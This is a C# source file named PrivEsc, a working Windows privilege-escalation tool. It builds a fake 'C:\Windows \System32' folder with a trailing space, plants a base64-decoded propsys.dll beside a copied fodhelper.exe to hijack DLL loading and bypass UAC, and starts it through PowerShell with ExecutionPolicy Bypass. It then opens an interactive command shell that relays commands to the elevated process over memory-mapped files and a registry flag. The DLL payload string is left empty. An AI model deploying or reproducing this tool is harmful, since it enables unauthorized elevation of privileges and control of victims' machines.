using System;
using Microsoft.Win32;
using System.IO.MemoryMappedFiles;
using System.Threading;
using System.Linq;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;




namespace PrivEsc
{ 
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool Wow64DisableWow64FsRedirection(ref IntPtr ptr);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool Wow64RevertWow64FsRedirection(IntPtr ptr);
        private static MemoryMappedFile GetExistingMMF(string name)
        {
            int c = 0;
            MemoryMappedFile mmf;
            while (c < 125)
            {
                try
                {
                    mmf = MemoryMappedFile.OpenExisting(name);
                    return mmf;
                }
                catch
                {
                    Thread.Sleep(40);
                }
                c += 1;
            }
            return null;
        }

        private static byte[] extractMmfData(MemoryMappedViewAccessor view)
        {
            byte[] byteData = new byte[view.Capacity];
            view.ReadArray(0, byteData, 0, (int)view.Capacity);
            view.Dispose();
            return byteData;
        }

        private static byte[] unpad(byte[] paddedData)
        {
            int c = paddedData.Length - 1;
            while (paddedData[c] != 114)
            {
                c--;
            }
            return paddedData.Take(c).ToArray();
        }

        public static byte[] Exctract(string name)
        {
            byte[] byteData;
            using (RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Default))
            {
                using (RegistryKey subkey = key.OpenSubKey("Environment", true))
                {
                    subkey.SetValue("UserEnvironment", 12, RegistryValueKind.DWord);
                    MemoryMappedFile mmf = GetExistingMMF(name);
                    if (mmf == null)
                    {
                        throw new Exception("Timed out waiting for MemoryMappedFile to become available");
                    }
                    using (MemoryMappedViewAccessor view = mmf.CreateViewAccessor())
                    {
                        byteData = extractMmfData(view);
                        view.Dispose();
                        mmf.Dispose();
                        subkey.SetValue("UserEnvironment", 1, RegistryValueKind.DWord);
                        subkey.Close();
                        key.Close();
                    }
                }
            }
            return byteData;
        }

        static bool SendData(byte[] output)
        {
            RegistryKey key;
            RegistryKey subkey;
            MemoryMappedFile mmf;
            MemoryMappedViewAccessor view;
            byte[] pad = new byte[] { 114 };
            output = output.Concat(pad).ToArray();
            using (key = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Default))
            {
                using (subkey = key.OpenSubKey("Environment", true))
                {
                    if ((int)subkey.GetValue("UserEnvironment") == 12)
                    {
                        subkey.SetValue("UserEnvironment", 0, RegistryValueKind.DWord);
                        using (mmf = MemoryMappedFile.CreateNew("MMMFFFC", output.Length))
                        {
                            view = mmf.CreateViewAccessor();
                            view.WriteArray(0, output, 0, output.Length);
                            view.Flush();
                            view.Dispose();
                            int c = 0;
                            while (((int)subkey.GetValue("UserEnvironment") == 0) && c < 750)
                            {
                                Thread.Sleep(40);
                                c++;
                            }
                            for (int n = 0; n < 2; n++)
                            {
                                mmf.Dispose();
                            }
                            return true;
                        }
                    }
                }
            }
            return false;
        }

        private static void CleanEnv()
        {
            try
            {
                Directory.Delete(@"C:\Windows \System32\", true);
                Directory.Delete(@"C:\Windows \");
            }
            catch
            {

            }
        }
        
        private static void fodhelper()
        {
            string powerShellCommand = "Start-Process -FilePath 'C:\\Windows \\System32\\fodhelper.exe'";

            ProcessStartInfo processInfo = new ProcessStartInfo()
            {
                FileName = "powershell.exe",
                Arguments = $"-NoProfile -ExecutionPolicy Bypass -Command \"{powerShellCommand}\"",
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true,
            };

            using (Process process = new Process())
            {
                process.StartInfo = processInfo;
                process.Start();
            }
        }
        private static void SetUpEnv(string baseDLL)
        {
            try
            {
                IntPtr oldValue = IntPtr.Zero;

                if (Wow64DisableWow64FsRedirection(ref oldValue))
                {
                    CleanEnv();
                    byte[] DLL = Convert.FromBase64String(baseDLL);
                    Directory.CreateDirectory(@"\\?\C:\Windows ");
                    Directory.CreateDirectory(@"\\?\C:\Windows \System32");
                    File.WriteAllBytes(@"\\?\C:\Windows \System32\propsys.dll", DLL);
                    File.Copy(@"C:\windows\system32\fodhelper.exe", @"\\?\C:\Windows \System32\fodhelper.exe");
                    Wow64RevertWow64FsRedirection(oldValue);
                    fodhelper();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
            }
        }

        static void Main(string[] args)
        {
            string baseDLL = "";
            SetUpEnv(baseDLL);
            while (true)
            {
                try
                {
                    Console.Write("127.0.0.1-> ");
                    string command = Console.ReadLine();
                    SendData(System.Text.Encoding.UTF8.GetBytes(command));
                    byte[] data = Exctract("MMMFFF");
                    if (data != null)
                    {
                        Console.Write(System.Text.Encoding.UTF8.GetString(unpad(data)));
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.Message);
                }
                Thread.Sleep(30);
            }
        }
    }
